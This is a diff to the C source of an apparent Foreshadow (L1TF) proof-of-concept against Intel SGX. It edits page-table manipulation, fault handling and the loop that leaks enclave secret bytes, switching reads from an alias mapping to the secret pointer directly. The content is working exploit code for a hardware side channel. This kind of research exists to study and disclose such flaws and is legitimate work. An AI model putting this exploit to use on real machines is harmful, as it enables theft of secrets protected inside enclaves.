@@ -60,7 +60,7 @@ void fault_handler(int signal) {
 
     /* remap enclave page, so abort page semantics apply and execution can continue. */
     *pte_alias = MARK_PRESENT(pte_alias_unmapped);
-    ASSERT(!mprotect((void *) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_READ | PROT_WRITE));
+//    ASSERT(!mprotect((void *) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_READ | PROT_WRITE));
 
 #if DUMP_SSA
     if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx)) )
@@ -95,7 +95,7 @@ void unmap_alias(void) {
     /* NOTE: we use mprotect so Linux is aware we unmapped the page and
      * delivers the exception to our user space handler, but we revert PTE
      * inversion mitgation manually afterwards */
-    ASSERT(!mprotect((void *) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_NONE));
+    ASSERT(!mprotect((void *) (((uint64_t) secret_ptr) & ~PFN_MASK), 0x1000, PROT_NONE));
     *pte_alias = pte_alias_unmapped;
 }
 
@@ -105,13 +105,13 @@ void attacker_config_page_table(void) {
     secret_page = (void *) ((uint64_t) secret_ptr & ~UINT64_C(0xfff));
 
     /* establish independent virtual alias mapping for enclave secret */
-    alias_ptr = remap_page_table_level(secret_ptr, PAGE);
+//    alias_ptr = remap_page_table_level(secret_ptr, PAGE);
     info("Randomly generated enclave secret at %p (page %p); alias at %p (revoking alias access rights)",
          secret_ptr, secret_page, alias_ptr);
     print_pte_adrs(secret_ptr);
 
     /* ensure a #PF on trigger accesses through the *alias* mapping */
-    ASSERT(pte_alias = remap_page_table_level(alias_ptr, PTE));
+    ASSERT(pte_alias = remap_page_table_level(secret_ptr, PTE));
     pte_alias_unmapped = MARK_NOT_PRESENT(*pte_alias);
     unmap_alias();
     print_pte(pte_alias);
@@ -165,7 +165,7 @@ int main(int argc, char **argv) {
         unmap_alias();
 #endif
 
-        recovered[i] = foreshadow(alias_ptr + i);
+        recovered[i] = foreshadow(secret_ptr + i);
     }
 
     info("verifying and destroying enclave secret..");
